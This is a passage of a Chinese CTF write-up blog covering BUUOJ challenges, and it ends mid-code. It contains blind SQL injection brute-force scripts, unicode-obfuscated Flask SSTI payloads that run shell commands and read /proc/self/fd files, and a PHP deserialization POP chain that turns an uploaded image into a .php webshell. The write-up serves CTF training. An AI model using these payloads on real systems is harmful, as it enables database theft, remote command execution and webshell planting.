&#x27;0&quot;.format(i,mid)</span></span><br><span class="line">            payload = <span class="string">&quot;0&#x27; or (ascii(substr((select group_concat(F4l9_C01uMn) from F4l9_D4t4B45e.F4l9_t4b1e),&#123;&#125;,1))&gt;&#123;&#125;) or &#x27;0&quot;</span>.<span class="built_in">format</span>(i,mid)</span><br><span class="line">            headers=&#123;</span><br><span class="line">                <span class="string">&#x27;Cookie&#x27;</span>:<span class="string">&#x27;track_uuid=1042e154-3129-4065-939a-e2c5f6d999e5&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;X-Forwarded-For&#x27;</span>:payload,</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment"># data=&#123;</span></span><br><span class="line">            <span class="comment">#     &#x27;id&#x27;:payload,</span></span><br><span class="line">            <span class="comment"># &#125;</span></span><br><span class="line"></span><br><span class="line">            res = requests.post(url=url,headers=headers)</span><br><span class="line">            <span class="comment">#res = requests.get(url=url,params=data)</span></span><br><span class="line">            <span class="comment"># print(res)</span></span><br><span class="line"></span><br><span class="line">            headers=&#123;</span><br><span class="line">                <span class="string">&#x27;Cookie&#x27;</span>:<span class="string">&#x27;track_uuid=1042e154-3129-4065-939a-e2c5f6d999e5&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;X-Forwarded-For&#x27;</span>:<span class="string">&#x27;payload&#x27;</span>,</span><br><span class="line">            &#125;</span><br><span class="line">            res = requests.post(url=url,headers=headers)</span><br><span class="line">            res = requests.post(url=url,headers=headers)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            </span><br><span class="line"></span><br><span class="line">            <span class="comment"># 字符串为成功的标志</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;Last Ip: 1&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                right = mid</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                left = mid+<span class="number">1</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 防止429</span></span><br><span class="line">            <span class="keyword">if</span> res.status_code == <span class="number">429</span>:</span><br><span class="line">                sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">            mid = (left+right)//<span class="number">2</span></span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        table+=<span class="built_in">chr</span>(mid)</span><br><span class="line">        <span class="built_in">print</span>(table)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">get_table()</span><br></pre></td></tr></table></figure><h2 id="盲注之ascii偏移"><a href="#盲注之ascii偏移" class="headerlink" title="盲注之ascii偏移"></a>盲注之ascii偏移</h2><p>使用场景</p><ul><li><p>关键字无过滤</p></li><li><p>select * from flag;的返回值只能为1行</p></li></ul><ol><li><p>判断字段数</p><p>假设有如下表，列数为2</p><p><img src="/../images/image-20220711155449466-1687489655114.png" alt="image-20220711155449466"></p><p>使用如下命令会报错</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> (<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>)<span class="operator">&gt;</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> flag)</span><br></pre></td></tr></table></figure></li><li><p>判断字段值</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span>(<span class="number">1</span>,<span class="number">1</span>)<span class="operator">&gt;</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> flag)</span><br></pre></td></tr></table></figure></li></ol><p><img src="/../images/image-20220711155653013-1687489655114.png" alt="image-20220711155653013"></p><p>​      <code>select(1,1)</code>的返回值为1,1;  <code>select * from flag</code>的返回值为1，’flag{xxxx}’；</p><p>​      1与1比较相等，1与’flag{xxxx}’比较，1&gt;’f’,所以最后返回的是1。</p><blockquote><p>​     因为mysql中数字与字符串比较与php中相同。</p></blockquote><p>所以我们可以根据此来编写脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&#x27;http://f6dc9323-7652-4182-8dd7-aea9fd09183f.node4.buuoj.cn:81/index.php&#x27;</span></span><br><span class="line"><span class="comment">#&#123;&#125;的位置是想要读取的字段值所在列</span></span><br><span class="line">payload=<span class="string">&#x27;0^((select 1,&quot;&#123;&#125;&quot;)&gt;(select * from f1ag_1s_h3r3_hhhhh))&#x27;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">200</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">        </span><br><span class="line">        hexchar=flag+<span class="built_in">chr</span>(j)</span><br><span class="line"></span><br><span class="line">        params=&#123;<span class="string">&#x27;id&#x27;</span>:payload.<span class="built_in">format</span>(hexchar)&#125;</span><br><span class="line"></span><br><span class="line">        re=requests.post(url=url,data=params)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Nu1L&#x27;</span> <span class="keyword">in</span> re.text:</span><br><span class="line">            <span class="comment"># -1是因为当&gt;成立时，差值为1</span></span><br><span class="line">            flag+=<span class="built_in">chr</span>(j-<span class="number">1</span>)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h1 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h1><p>[网鼎杯 2020 白虎组]PicDown</p><p>[pasecactf_2019]flask_ssti</p><p>提示</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">line, key, key2</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(x ^ <span class="built_in">ord</span>(line[x]) ^ <span class="built_in">ord</span>(key[::-<span class="number">1</span>][x]) ^ <span class="built_in">ord</span>(key2[x])) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(line)))</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;flag&#x27;</span>] = encode(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;GQIS5EmzfZA1Ci8NslaoMxPXqrvFB7hYOkbg9y20W34&#x27;</span>, <span class="string">&#x27;xwdFqMck1vA0pl7B8WO3DrGLma4sZ2Y6ouCPEHSQVT5&#x27;</span>)</span><br></pre></td></tr></table></figure><p>在config中保存了flag加密后的值。</p><p>这题要开代理才能做，不然文件加载不了。。</p><p><img src="/../images/image-20221008124443508-1686983099354.png" alt="image-20221008124443508"></p><p>有过滤，unicode编码绕过</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[][<span class="string">&quot;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&quot;</span>][<span class="string">&quot;\u005f\u005f\u0062\u0061\u0073\u0065\u005f\u005f&quot;</span>][<span class="string">&quot;\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f&quot;</span>]()&#125;&#125;</span><br></pre></td></tr></table></figure><p>有回显当前环境下的类，那就正常找可利用类的位置</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;()[<span class="string">&quot;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&quot;</span>][<span class="string">&quot;\u005f\u005f\u0062\u0061\u0073\u0065\u0073\u005f\u005f&quot;</span>][<span class="number">0</span>][<span class="string">&quot;\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f&quot;</span>]()[<span class="number">80</span>][<span class="string">&quot;\u006c\u006f\u0061\u0064\u005f\u006d\u006f\u0064\u0075\u006c\u0065&quot;</span>](<span class="string">&quot;os&quot;</span>)[<span class="string">&quot;popen&quot;</span>](<span class="string">&quot;ls /&quot;</span>)|attr(<span class="string">&quot;read&quot;</span>)()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221008124706289-1686983099353.png" alt="image-20221008124706289"></p><p>可以看到是可以执行命令的。然后根据提示，就需要我们读取python文件。</p><h5 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h5><blockquote><ol><li><strong>在 linux 系统中如果一个程序用open()打开了一个文件但最终没有关闭他，即便从外部（如os.remove(SECRET_FILE)）删除这个文件之后，在 &#x2F;proc 这个进程的 pid 目录下的 fd 文件描述符目录下还是会有这个文件的文件描述符，通过这个文件描述符我们即可得到被删除文件的内容。</strong></li><li><strong><code>/proc/self</code>在使用时，我们是不能通过命令的方式执行通过cat命令读取cmdline的，因为如果是cat读取&#x2F;proc&#x2F;self&#x2F;cmdline的话，得到的是cat进程的信息，所以我们要通过题目的当前进程使用读取文件（如文件包含漏洞，或者SSTI使用file模块读取文件）的方式读取&#x2F;proc&#x2F;self&#x2F;cmdline。</strong></li></ol></blockquote><ul><li><p>读取当前进程</p><ul><li><p>&lt;class ‘_frozen_importlib_external.FileLoader’&gt;这个类，其下有[“get_data”]方法可以读取文件。</p></li><li><p>为什么不能直接用命令cat读取呢？</p><p>因为&#x2F;proc&#x2F;self存储的是当前进程下的信息，如果使用cat命令读取的就是cat进程的信息，而不是当前进程的信息。</p></li></ul></li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;()[<span class="string">&quot;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&quot;</span>][<span class="string">&quot;\u005f\u005f\u0062\u0061\u0073\u0065\u0073\u005f\u005f&quot;</span>][<span class="number">0</span>][<span class="string">&quot;\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f&quot;</span>]()[<span class="number">91</span>][<span class="string">&quot;\u0067\u0065\u0074\u005f\u0064\u0061\u0074\u0061&quot;</span>](<span class="number">0</span>, <span class="string">&quot;/proc/self/cmdline&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221008125010896-1686983099354.png" alt="image-20221008125010896"></p><ul><li>读取app.py,这里app.py也被过滤了</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;()[<span class="string">&quot;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&quot;</span>][<span class="string">&quot;\u005f\u005f\u0062\u0061\u0073\u0065\u0073\u005f\u005f&quot;</span>][<span class="number">0</span>][<span class="string">&quot;\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f&quot;</span>]()[<span class="number">91</span>][<span class="string">&quot;\u0067\u0065\u0074\u005f\u0064\u0061\u0074\u0061&quot;</span>](<span class="number">0</span>, <span class="string">&quot;\u0061\u0070\u0070\u002e\u0070\u0079&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><p>整理一下得到的源码，发现把最重要的部分放在了注释里。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;/app/flag&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">flag = file.read()</span><br><span class="line">flag = flag[:<span class="number">42</span>]</span><br><span class="line">app.config[<span class="string">&#x27;flag&#x27;</span>] = encode(flag, <span class="string">&#x27;GQIS5EmzfZA1Ci8NslaoMxPXqrvFB7hYOkbg9y20W3&#x27;</span>, <span class="string">&#x27;xwdFqMck1vA0pl7B8WO3DrGLma4sZ2Y6ouCPEHSQVT&#x27;</span>)</span><br><span class="line">flag = os.remove(<span class="string">&quot;/app/flag&quot;</span>)</span><br></pre></td></tr></table></figure><p>可以看到flag明文是放在&#x2F;app&#x2F;flag中的，并且只进行了open操作，没有close操作。</p><blockquote><p><strong>在 linux 系统中如果一个程序用open()打开了一个文件但最终没有关闭他，即便从外部（如os.remove(SECRET_FILE)）删除这个文件之后，在 &#x2F;proc 这个进程的 pid 目录下的 fd 文件描述符目录下还是会有这个文件的文件描述符，通过这个文件描述符我们即可得到被删除文件的内容。</strong></p></blockquote><p>所以我们要去读取&#x2F;proc&#x2F;self&#x2F;fd&#x2F;？,得到&#x2F;app&#x2F;flag文件</p><p>payload</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;()[<span class="string">&quot;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&quot;</span>][<span class="string">&quot;\u005f\u005f\u0062\u0061\u0073\u0065\u0073\u005f\u005f&quot;</span>][<span class="number">0</span>][<span class="string">&quot;\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f&quot;</span>]()[<span class="number">91</span>][<span class="string">&quot;\u0067\u0065\u0074\u005f\u0064\u0061\u0074\u0061&quot;</span>](<span class="number">0</span>, <span class="string">&quot;/proc/self/fd/3&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><blockquote><p>3是通过burp爆破得到的。</p></blockquote><p>实际上还有另一种解法，因为提示中给了flag是放在config环境变量中的，加密算法用了异或是对称加密，而且这道题没有过滤config，所以我们直接<code>&#123;&#123;config&#125;&#125;</code>拿到加密后的flag，对其进行加密就能得到flag的明文形式了。</p><h1 id="php反序列化"><a href="#php反序列化" class="headerlink" title="php反序列化"></a>php反序列化</h1><h2 id="强网杯-2019-Upload"><a href="#强网杯-2019-Upload" class="headerlink" title="[强网杯 2019]Upload"></a>[强网杯 2019]Upload</h2><p>cookie中存在序列化内容</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a:<span class="number">5</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;ID&quot;</span>;i:<span class="number">3</span>;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;khaz&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;email&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;123@qq.com&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">32</span>:<span class="string">&quot;202cb962ac59075b964b07152d234b70&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">79</span>:<span class="string">&quot;../upload/c47b21fcf8f0bc8b3920541abd8024fd/8052c42ab3b8aa06a3f5f788a4ddccc2.png&quot;</span>&#125;</span><br></pre></td></tr></table></figure><blockquote><p>保存的是我们用户的信息</p></blockquote><p>信息收集得到源代码</p><p>序列化</p><p>Login::login</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#登录后，设置cookie&#123;user:base64_encode(serialize($user_info))&#125;</span></span><br><span class="line">            <span class="variable">$user_info</span>=<span class="title function_ invoke__">db</span>(<span class="string">&quot;user&quot;</span>)-&gt;<span class="title function_ invoke__">where</span>(<span class="string">&quot;email&quot;</span>,<span class="variable">$email</span>)-&gt;<span class="title function_ invoke__">find</span>();</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$user_info</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>) === <span class="variable">$user_info</span>[<span class="string">&#x27;password&#x27;</span>]) &#123;</span><br><span class="line">                    <span class="variable">$cookie_data</span>=<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$user_info</span>));</span><br><span class="line">                    <span class="title function_ invoke__">cookie</span>(<span class="string">&quot;user&quot;</span>,<span class="variable">$cookie_data</span>,<span class="number">3600</span>);</span><br><span class="line">                    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">success</span>(<span class="string">&#x27;Login successful!&#x27;</span>, <span class="title function_ invoke__">url</span>(<span class="string">&#x27;../home&#x27;</span>));</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">error</span>(<span class="string">&#x27;Login failed!&#x27;</span>, <span class="title function_ invoke__">url</span>(<span class="string">&#x27;../index&#x27;</span>));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>Profile::update_cookie</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#更换头像后，更新cookie</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_cookie</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;checker-&gt;profile[<span class="string">&#x27;img&#x27;</span>]=<span class="variable language_">$this</span>-&gt;img;</span><br><span class="line">        <span class="title function_ invoke__">cookie</span>(<span class="string">&quot;user&quot;</span>,<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$this</span>-&gt;checker-&gt;profile)),<span class="number">3600</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>反序列化</p><p>Index::login_check()</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login_check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$profile</span>=<span class="title function_ invoke__">cookie</span>(<span class="string">&#x27;user&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$profile</span>))&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;profile=<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$profile</span>));</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;profile_db=<span class="title function_ invoke__">db</span>(<span class="string">&#x27;user&#x27;</span>)-&gt;<span class="title function_ invoke__">where</span>(<span class="string">&quot;ID&quot;</span>,<span class="title function_ invoke__">intval</span>(<span class="variable">$this</span>-&gt;profile[<span class="string">&#x27;ID&#x27;</span>]))-&gt;<span class="title function_ invoke__">find</span>();</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">array_diff</span>(<span class="variable">$this</span>-&gt;profile_db,<span class="variable">$this</span>-&gt;profile)==<span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><blockquote><p>该函数用于检验用户是否已登录，在登录后的每个界面都要被调用。</p></blockquote><p>文件上传后的操作</p><p>经典php文件上传操作，引用菜鸟教程的gif</p><p><img src="/../images/upload-form.gif" alt="img"></p><p>最后得到的图片路径就是这样的</p><p>..&#x2F;upload&#x2F;c47b21fcf8f0bc8b3920541abd8024fd&#x2F;8052c42ab3b8aa06a3f5f788a4ddccc2.png</p><blockquote><p>因为后缀名一定是png，所以正常来说是无法利用的，但是这里存在反序列化漏洞，导致我们可以自定义文件名</p></blockquote><p>Profile::upload_img()</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload_img</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">#调用Index::login_check(),检验用户是否存在</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;checker)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="variable language_">$this</span>-&gt;checker-&gt;<span class="title function_ invoke__">login_check</span>())&#123;</span><br><span class="line">                <span class="variable">$curr_url</span>=<span class="string">&quot;http://&quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>].<span class="variable">$_SERVER</span>[<span class="string">&#x27;SCRIPT_NAME&#x27;</span>].<span class="string">&quot;/index&quot;</span>;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">redirect</span>(<span class="variable">$curr_url</span>,<span class="number">302</span>);</span><br><span class="line">                <span class="keyword">exit</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">#对上传文件的文件名进行处理</span></span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>))&#123;</span><br><span class="line">            <span class="comment">#设置临时文件名</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;filename_tmp=<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="comment">#设置文件名，加上.png后缀</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;filename=<span class="title function_ invoke__">md5</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]).<span class="string">&quot;.png&quot;</span>;</span><br><span class="line">            <span class="comment">#检验文件后缀名是否为png</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">ext_check</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;ext) &#123;</span><br><span class="line">            <span class="comment">#获取文件大小判断是否为 图片</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">getimagesize</span>(<span class="variable">$this</span>-&gt;filename_tmp)) &#123;</span><br><span class="line">                <span class="comment">#将临时文件复制到创建的文件中</span></span><br><span class="line">                @<span class="title function_ invoke__">copy</span>(<span class="variable">$this</span>-&gt;filename_tmp, <span class="variable">$this</span>-&gt;filename);</span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$this</span>-&gt;filename_tmp);</span><br><span class="line">                <span class="comment">#设置图片路径</span></span><br><span class="line">                <span class="variable language_">$this</span>-&gt;img=<span class="string">&quot;../upload/<span class="subst">$this</span>-&gt;upload_menu/<span class="subst">$this</span>-&gt;filename&quot;</span>;</span><br><span class="line">                <span class="comment">#更新头像图片</span></span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">update_img</span>();</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">error</span>(<span class="string">&#x27;Forbidden type!&#x27;</span>, <span class="title function_ invoke__">url</span>(<span class="string">&#x27;../index&#x27;</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">error</span>(<span class="string">&#x27;Unknow file type!&#x27;</span>, <span class="title function_ invoke__">url</span>(<span class="string">&#x27;../index&#x27;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>关注</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#将临时文件复制到创建的文件中</span></span><br><span class="line">@<span class="title function_ invoke__">copy</span>(<span class="variable">$this</span>-&gt;filename_tmp, <span class="variable">$this</span>-&gt;filename);</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="variable">$this</span>-&gt;filename_tmp);</span><br><span class="line"><span class="comment">#设置图片路径</span></span><br><span class="line"><span class="variable language_">$this</span>-&gt;img=<span class="string">&quot;../upload/<span class="subst">$this</span>-&gt;upload_menu/<span class="subst">$this</span>-&gt;filename&quot;</span>;</span><br></pre></td></tr></table></figure><blockquote><p>令filename_tmp为我们上传的木马文件路径</p><p>只要我们可以控制filename，我们就可以自定义木马文件的文件名，就可以解析木马文件</p></blockquote><p>看一下Profile类的魔术方法</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;except[<span class="variable">$name</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;&#123;<span class="variable">$name</span>&#125;)&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;&#123;<span class="variable language_">$this</span>-&gt;&#123;<span class="variable">$name</span>&#125;&#125;(<span class="variable">$arguments</span>);</span><br><span class="line">       &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>可以得到如果触发了call方法，就可以触发get方法。因为Profile类没有name属性，而call方法中访问了这个属性。</p><p>所以我们可以构造except[$name]&#x3D;&#x3D;upload_img，就可以调用upload_img方法。</p></blockquote><p>再找一下谁能触发call方法</p><p>Register::destruct</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">if</span>(!<span class="variable language_">$this</span>-&gt;registed)&#123;</span><br><span class="line">           <span class="variable language_">$this</span>-&gt;checker-&gt;<span class="title function_ invoke__">index</span>();</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><blockquote><p>让checker为Profile类即可</p></blockquote><p>pop链</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Register</span>::<span class="variable constant_">destruct</span> → <span class="title class_">Profile</span>::<span class="variable constant_">call</span> → <span class="title class_">Profile</span>::<span class="variable constant_">get</span> → <span class="title class_">Profile</span>::<span class="variable constant_">upload_img</span></span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#要加命名空间，否则php不知道序列化哪一个类。</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">web</span>\<span class="title class_">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$checker</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename_tmp</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$upload_menu</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ext</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$img</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$except</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Register</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$checker</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$registed</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$profile</span> = <span class="keyword">new</span> <span class="title class_">Profile</span>();</span><br><span class="line"><span class="variable">$profile</span>-&gt;except = [<span class="string">&#x27;index&#x27;</span> =&gt; <span class="string">&#x27;img&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>-&gt;img = <span class="string">&quot;upload_img&quot;</span>;</span><br><span class="line"><span class="variable">$profile</span>-&gt;ext = <span class="string">&quot;png&quot;</span>;</span><br><span class="line"><span class="variable">$profile</span>-&gt;filename_tmp = <span class="string">&quot;./upload/c47b21fcf8f0bc8b3920541abd8024fd/10fb15c77258a991b0028080a64fb42d.png&quot;</span>;</span><br><span class="line"><span class="variable">$profile</span>-&gt;filename = <span class="string">&quot;./upload/c47b21fcf8f0bc8b3920541abd8024fd/10fb15c77258a991b0028080a64fb42d.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$register</span> = <span class="keyword">new</span> <span class="title class_">Register</span>();</span><br><span class="line"><span class="variable">$register</span>-&gt;registed = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$register</span>-&gt;checker = <span class="variable">$profile</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$register</span>)));</span><br></pre></td></tr></table></figure><p>把得到的序列化内容放入cookie中，刷新几次，就可以发现文件名变化，木马文件生效。</p><h2 id="安洵杯-2019-不是文件上传"><a href="#安洵杯-2019-不是文件上传" class="headerlink" title="[安洵杯 2019]不是文件上传"></a>[安洵杯 2019]不是文件上传</h2><p>信息收集</p><ol><li><p>源码上传到gitub上了</p><p><img src="/../images/1583830520899-1687419234884.png" alt="img"></p><p><img src="/../images/1583830536747-1687419234885.png" alt="img"></p><p><img src="/../images/image-20220807130328561-1687419234885.png" alt="image-20220807130328561"></p></li><li><p>show.php中的提示</p><p><img src="/../images/image-20220807130405750-1687419234885.png" alt="image-20220807130405750"></p><blockquote><p>半成品，只有文件的名字被保存。</p></blockquote></li></ol><p>代码审计</p><ol><li><p>序列化入口</p><p>helper类</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"><span 